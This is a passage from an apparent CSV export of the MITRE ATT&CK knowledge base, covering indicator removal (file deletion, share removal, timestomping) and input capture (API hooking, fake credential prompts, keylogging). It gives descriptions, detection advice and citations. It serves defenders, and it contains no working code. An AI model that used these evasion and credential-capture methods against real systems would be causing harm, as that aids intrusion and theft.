2010),(Citation: Talos Olympic Destroyer 2018),(Citation: SentinelLabs Metador Sept 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: GitHub Pupy),(Citation: FireEye Hacking Team),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1070.004,attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c,Indicator Removal: File Deletion,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",https://attack.mitre.org/techniques/T1070/004,31 January 2020,16 April 2022,enterprise-attack,1.1,Defense Evasion,"It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.","Linux, Windows, macOS","Command: Command Execution, File: File Deletion",True,T1070,Host forensic analysis,Walker Johnson,,,,,,"(Citation: CrowdStrike IceApple May 2022),(Citation: FireEye CARBANAK June 2017),(Citation: Cyphort EvilBunny Dec 2014),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Unit 42 Inception November 2018),(Citation: FBI FLASH APT39 September 2020),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Booz Allen Hamilton),(Citation: Fysbis Dr Web Analysis),(Citation: Cisco Ukraine Wipers January 2022),(Citation: FireEye FELIXROOT July 2018),(Citation: Bitdefender StrongPity June 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Dell Lateral Movement),(Citation: Symantec Hydraq Jan 2010),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 OilRig Sept 2018),(Citation: ESET Sednit USBStealer 2014),(Citation: Symantec Shuckworm January 2022),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Cisco Talos Intelligence Group),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Novetta Blockbuster),(Citation: Securelist Calisto July 2018),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: ESET Grandoreiro April 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Talos Lokibot Jan 2021),(Citation: Sofacy Komplex Trojan),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Palo Alto Reaver Nov 2017),(Citation: Trend Micro IXESHE 2012),(Citation: Check Point Meteor Aug 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Unit 42 Hildegard Malware),(Citation: Group IB GrimAgent July 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: US-CERT TA18-074A),(Citation: ESET Dukes October 2019),(Citation: Profero APT27 December 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Korean FSI TA505 2020),(Citation: Cylance Shaheen Nov 2018),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Talos Bisonal Mar 2020),(Citation: Symantec FIN8 Jul 2023),(Citation: CERT-FR PYSA April 2020),(Citation: Malwarebytes Kimsuky June 2021),(Citation: CheckPoint Bandook Nov 2020),(Citation: CISA EB Aug 2020),(Citation: Dell Sakula),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Unit 42 VERMIN Jan 2018),(Citation: FireEye Periscope March 2018),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: ESET Lazarus Jun 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: alientvault macspy),(Citation: ESET Attor Oct 2019),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: ESET OceanLotus macOS April 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Fidelis INOCNATION),(Citation: Microsoft PLATINUM April 2016),(Citation: FireEye APT41 Aug 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye FIN10 June 2017),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: XAgentOSX 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ESET Okrum July 2019),(Citation: TrendMicro Gamaredon April 2020),(Citation: McAfee Gold Dragon),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET InvisiMole June 2018),(Citation: Intel 471 REvil March 2020),(Citation: Unit42 BabyShark Apr 2019),(Citation: Gh0stRAT ATT March 2019),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Flashpoint FIN 7 March 2019),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Anomali Rocke March 2019),(Citation: FireEye MuddyWater Mar 2018),(Citation: Kaspersky MoleRATs April 2019),(Citation: Talos Promethium June 2020),(Citation: FireEye FIN7 April 2017),(Citation: CheckPoint Naikon May 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: McAfee Cuba April 2021),(Citation: Accenture Hogfish April 2018),(Citation: TrendMicro MacOS April 2018),(Citation: objsee mac malware 2017),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: Kaspersky WIRTE November 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: Cylance Dust Storm),(Citation: fsecure NanHaiShu July 2016),(Citation: Citizen Lab Group5),(Citation: SentinelLabs Metador Sept 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Telebots July 2017),(Citation: Unit42 Emissary Panda May 2019),(Citation: FireEye MESSAGETAP October 2019),(Citation: Mandiant APT1 Appendix),(Citation: Bitdefender Naikon April 2021),(Citation: Talos PoetRAT April 2020),(Citation: GDATA Zeus Panda June 2017),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ESET Zebrocy Nov 2018),(Citation: Palo Alto Networks BBSRAT),(Citation: FireEye Hancitor),(Citation: FireEye Hacking Team),(Citation: Symantec Pasam May 2012),(Citation: Trustwave GoldenSpy2 June 2020),(Citation: Microsoft SIR Vol 21),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: McAfee Oceansalt Oct 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: ESET Machete July 2019),(Citation: ESET GreyEnergy Oct 2018),(Citation: Symantec Linfo May 2012),(Citation: ESET DazzleSpy Jan 2022),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Secureworks Karagany July 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: FireEye Clandestine Fox),(Citation: ESET Zebrocy May 2019),(Citation: FoxIT Wocao December 2019),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cycraft Chimera April 2020),(Citation: McAfee Bankshot),(Citation: ESET Gelsemium June 2021),(Citation: FireEye FIN7 Oct 2019),(Citation: ASERT InnaputRAT April 2018),(Citation: CISA Zebrocy Oct 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: ANSSI Sandworm January 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Fidelis njRAT June 2013),(Citation: ZScaler Hacking Team),(Citation: Talos Cobalt Group July 2018),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: ESET LightNeuron May 2019),(Citation: Cybereason Oceanlotus May 2017),(Citation: ESET Operation Groundbait),(Citation: Unit 42 NETWIRE April 2020),(Citation: Group IB Silence Sept 2018),(Citation: Unit42 OceanLotus 2017),(Citation: TechNet Del),(Citation: Kaspersky Lyceum October 2021),(Citation: Cybereason StrifeWater Feb 2022),(Citation: McAfee Honeybee),(Citation: ESET Sednit Part 2),(Citation: KISA Operation Muzabi),(Citation: CrowdStrike Putter Panda),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Palo Alto MoonWind March 2017),(Citation: McAfee Sharpshooter December 2018),(Citation: FireEye FIN6 April 2016),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Securelist WhiteBear Aug 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET LoudMiner June 2019),(Citation: McAfee Night Dragon),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Microsoft SDelete July 2016),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Mandiant No Easy Breach),(Citation: Trend Micro DRBControl February 2020),(Citation: Gigamon BADHATCH Jul 2019),(Citation: Trustwave Cherry Picker),(Citation: ESET Sednit Part 1),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Medium Metamorfo Apr 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: CarbonBlack LockerGoga 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Volexity PowerDuke November 2016),(Citation: objective-see windtail2 jan 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: Proofpoint TA505 October 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Carbon Black HotCroissant April 2020),(Citation: Kaspersky Turla Aug 2014),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Cybereason Kimsuky November 2020),(Citation: ESET EvilNum July 2020),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Group IB Ransomware September 2020),(Citation: Novetta Winnti April 2015),(Citation: Unit42 RDAT July 2020),(Citation: Malwarebytes Pony April 2016),(Citation: Trend Micro njRAT 2018),(Citation: FireEye APT38 Oct 2018),(Citation: ATT QakBot April 2021),(Citation: Sophos SamSam Apr 2018),(Citation: CERT-EE Gamaredon January 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Unit42 Redaman January 2019),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Leonardo Turla Penquin May 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Crowdstrike Qakbot October 2020),(Citation: Talos ZxShell Oct 2014),(Citation: ESET Gazer Aug 2017),(Citation: Trustwave Pillowmint June 2020),(Citation: NCCGroup RokRat Nov 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: Kaspersky StoneDrill 2017),(Citation: FireEye APT17),(Citation: ClearSky Siamesekitten August 2021),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: FireEye APT32 May 2017),(Citation: Fidelis Turbo),(Citation: US-CERT TYPEFRAME June 2018),(Citation: FireEye TRITON 2019),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: ESET RTM Feb 2017),(Citation: jRAT Symantec Aug 2018),(Citation: Check Point Pay2Key November 2020),(Citation: ESET Telebots Dec 2016),(Citation: Talos Konni May 2017),(Citation: NSA/FBI Drovorub August 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: DFIR Phosphorus November 2021),(Citation: Unit42 Azorult Nov 2018),(Citation: Securelist Dtrack),(Citation: ESET InvisiMole June 2020),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: ESET Hermetic Wizard March 2022),(Citation: Symantec Seaduke 2015),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Kroll Qakbot June 2020),(Citation: Symantec Remsec IOCs),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: McAfee GhostSecret),(Citation: Symantec Dragonfly),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: NCC Group Team9 June 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye APT35 2018),"
T1070.005,attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c,Indicator Removal: Network Share Connection Removal,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use),https://attack.mitre.org/techniques/T1070/005,31 January 2020,13 April 2023,enterprise-attack,1.1,Defense Evasion,"Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.",Windows,"Command: Command Execution, Network Traffic: Network Traffic Content, Process: Process Creation, User Account: User Account Authentication",True,T1070,Host forensic analysis,,,,Established network share connection to a remote system. Level of access depends on permissions of the account used.,,,"(Citation: ESET InvisiMole June 2018),(Citation: CarbonBlack RobbinHood May 2019),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Technet Net Use),"
T1070.006,attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611,Indicator Removal: Timestomp,"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.

Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",https://attack.mitre.org/techniques/T1070/006,31 January 2020,29 March 2020,enterprise-attack,1.0,Defense Evasion,Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.,"Linux, Windows, macOS","File: File Metadata, File: File Modification",True,T1070,Host forensic analysis,"Romain Dumont, ESET","root, SYSTEM, User",,,,,"(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET Kobalos Jan 2021),(Citation: FireEye POSHSPY April 2017),(Citation: FireEye Periscope March 2018),(Citation: Lotus Blossom Jun 2015),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Novetta Blockbuster Loaders),(Citation: Unit 42 PingPull Jun 2022),(Citation: NCC Group Chimera January 2021),(Citation: ESET Attor Oct 2019),(Citation: ESET DazzleSpy Jan 2022),(Citation: ESET OceanLotus macOS April 2019),(Citation: 20 macOS Common Tools and Techniques),(Citation: MoustachedBouncer ESET August 2023),(Citation: Scarlet Mimic Jan 2016),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: Crowdstrike DNC June 2016),(Citation: Crowdstrike Indrik November 2018),(Citation: NHS UK BLINDINGCAN Aug 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Lee 2013),(Citation: McAfee Bankshot),(Citation: Prevailion EvilNum May 2020),(Citation: ESET Gelsemium June 2021),(Citation: ESET InvisiMole June 2018),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: ESET Sednit USBStealer 2014),(Citation: Novetta Winnti April 2015),(Citation: ESET OceanLotus Mar 2019),(Citation: Novetta Blockbuster),(Citation: McAfee Shamoon December 2018),(Citation: Anomali Rocke March 2019),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Novetta-Axiom),(Citation: ESET Gazer Aug 2017),(Citation: FireEye APT32 May 2017),(Citation: Fidelis Turbo),(Citation: NCSC Joint Report Public Tools),(Citation: FireEye TRITON 2019),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: CrowdStrike Putter Panda),(Citation: Cylance Dust Storm),(Citation: Github PowerShell Empire),(Citation: ESET Turla PowerShell May 2019),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Dell TG-3390),(Citation: cobaltstrike manual),(Citation: Novetta Blockbuster Destructive Malware),(Citation: ClearSky Wilted Tulip July 2017),(Citation: McAfee GhostSecret),"
T1056.004,attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6,Input Capture: Credential API Hooking,"Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:

* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)
* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
",https://attack.mitre.org/techniques/T1056/004,11 February 2020,10 November 2020,enterprise-attack,1.0,"Collection, Credential Access","Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)

Rootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.

Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)",Windows,"Process: OS API Execution, Process: Process Metadata",True,T1056,,,"Administrator, SYSTEM",,,,,"(Citation: Elastic Process Injection July 2017),(Citation: FinFisher Citation),(Citation: FireEye FIN7 Oct 2019),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Securelist Sofacy Feb 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Microsoft PLATINUM April 2016),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Github PowerShell Empire),(Citation: Talos ZxShell Oct 2014),(Citation: Prevx Carberp March 2011),"
T1056.002,attack-pattern--a2029942-0a85-4947-b23c-ca434698171d,Input Capture: GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) ",https://attack.mitre.org/techniques/T1056/002,11 February 2020,30 March 2023,enterprise-attack,1.2,"Collection, Credential Access","Monitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) that could be used to prompt users for credentials. For example, command/script history including abnormal parameters (such as requests for credentials and/or strings related to creating password prompts) may be malicious.(Citation: Spoofing credential dialogs) 

Inspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources. ","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, Script: Script Execution",True,T1056,,"Matthew Molyett, @s1air, Cisco Talos",User,,,,,"(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: synack 2016 review),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Symantec Calisto July 2018),(Citation: objsee mac malware 2017),(Citation: FireEye Hacking FIN4 Video Dec 2014),"
T1056.001,attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4,Input Capture: Keylogging,"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:

* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.
* Reading raw keystroke data from the hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",https://attack.mitre.org/techniques/T1056/001,11 February 2020,01 October 2023,enterprise-attack,1.2,"Collection, Credential Access","Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.","Linux, Network, Windows, macOS","Driver: Driver Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification",True,T1056,,TruKno,,,,,,"(Citation: Unit 42 BadPatch Oct 2017),(Citation: Cofense Astaroth Sept 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: Palo Alto Rover),(Citation: FireEye CARBANAK June 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: Forcepoint Monsoon),(Citation: Booz Allen Hamilton),(Citation: McAfee Netwire Mar 2015),(Citation: Cybereason PowerLess February 2022),(Citation: ESET Casbaneiro Oct 2019),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Crowdstrike DNC June 2016),(Citation: Red Canary NETWIRE January 2020),(Citation: Cylance Cleaver),(Citation: Talent-Jump Clambling February 2020),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Objective-See MacMa Nov 2021),(Citation: Talos Remcos Aug 2018),(Citation: Trendmicro Evolving ThiefQuest 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Symantec Sowbug Nov 2017),(Citation: Kaspersky Darkhotel),(Citation: Novetta Blockbuster),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: ESET Grandoreiro April 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: SentinelOne MacMa Nov 2021),(Citation: Ukraine15 - EISAC - 201603),(Citation: SecureWorks August 2019),(Citation: Talos Agent Tesla Oct 2018),(Citation: Check Point Warzone Feb 2020),(Citation: Microsoft SIR Vol 19),(Citation: DustySky),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: CISA AA20-301A Kimsuky),(Citation: AsyncRAT GitHub),(Citation: Github PowerShell Empire),(Citation: Novetta Blockbuster Tools),(Citation: Profero APT27 December 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: Kaspersky Adwind Feb 2016),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Alienvault Sykipot DOD Smart Cards),(Citation: BH Manul Aug 2016),(Citation: Korean FSI TA505 2020),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: Kaspersky NetTraveler),(Citation: Cylance Shaheen Nov 2018),(Citation: Symantec Catchamas April 2018),(Citation: Symantec Chafer February 2018),(Citation: Baumgartner Naikon 2015),(Citation: Fysbis Palo Alto Analysis),(Citation: Fortinet Metamorfo Feb 2020),(Citation: PaloAlto NanoCore Feb 2016),(Citation: cobaltstrike manual),(Citation: FireEye Poison Ivy),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Talos ROKRAT),(Citation: CISA EB Aug 2020),(Citation: ASERT Donot March 2018),(Citation: GitHub QuasarRAT),(Citation: TrendMicro Tonto Team October 2020),(Citation: FireEye Periscope March 2018),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: ESET Attor Oct 2019),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Kaspersky Carbanak),(Citation: Microsoft PLATINUM April 2016),(Citation: FireEye APT41 Aug 2019),(Citation: GitHub PoshC2),(Citation: Imminent Unit42 Dec2019),(Citation: XAgentOSX 2017),(Citation: ESET Okrum July 2019),(Citation: McAfee Gold Dragon),(Citation: Securelist Machete Aug 2014),(Citation: Unit42 BabyShark Apr 2019),(Citation: Gh0stRAT ATT March 2019),(Citation: FSecure Lokibot November 2019),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Kaspersky Regin),(Citation: Zscaler Cobian Aug 2017),(Citation: Cylance Machete Mar 2017),(Citation: Alintanahin 2014),(Citation: McAfee Cuba April 2021),(Citation: Symantec Darkmoon Aug 2005),(Citation: Unit 42 Nokki Oct 2018),(Citation: Talos NavRAT May 2018),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: objsee mac malware 2017),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Citizen Lab Group5),(Citation: SentinelLabs Metador Sept 2022),(Citation: Fortinet Agent Tesla June 2017),(Citation: Mandiant APT1 Appendix),(Citation: Fortinet Remcos Feb 2017),(Citation: Mandiant FIN13 Aug 2022),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: GDATA Zeus Panda June 2017),(Citation: Hacker News LuckyMouse June 2018),(Citation: Radware Micropsia July 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro Daserf Nov 2017),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: ESET Machete July 2019),(Citation: ESET GreyEnergy Oct 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Secureworks Karagany July 2019),(Citation: MoustachedBouncer ESET August 2023),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: NCC Group APT15 Alive and Strong),(Citation: FoxIT Wocao December 2019),(Citation: PowerSploit Documentation),(Citation: Zscaler Kasidet),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Fidelis njRAT June 2013),(Citation: FireEye APT33 Webinar Sept 2017),(Citation: Trend Micro Qakbot December 2020),(Citation: ESET Operation Groundbait),(Citation: Palo Alto OilRig May 2016),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Kaspersky QakBot September 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: FireEye NETWIRE March 2019),(Citation: ESET Sednit Part 2),(Citation: Check Point Rocket Kitten),(Citation: KISA Operation Muzabi),(Citation: Palo Alto MoonWind March 2017),(Citation: Microsoft NICKEL December 2021),(Citation: CIRCL PlugX March 2013),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec W32.Duqu),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: Trend Micro DRBControl February 2020),(Citation: Symantec Buckeye),(Citation: F-Secure The Dukes),(Citation: Scarlet 